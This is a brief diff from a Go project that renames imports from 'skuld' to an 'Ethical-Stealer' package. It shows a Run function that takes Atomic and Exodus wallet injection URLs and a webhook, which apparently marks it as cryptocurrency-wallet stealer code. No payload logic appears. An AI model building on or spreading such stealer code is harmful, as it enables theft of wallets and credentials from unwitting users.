@@ -6,8 +6,8 @@ import (
 	"os"
 	"path/filepath"
 
-	"github.com/hackirby/skuld/utils/fileutil"
-	"github.com/hackirby/skuld/utils/hardware"
+	"github.com/opiumsoftware/Ethical-Stealer/ethicalstealer/utils/fileutil"
+	"github.com/opiumsoftware/Ethical-Stealer/ethicalstealer/utils/hardware"
 )
 
 func Run(atomic_injection_url, exodus_injection_url, webhook string) {
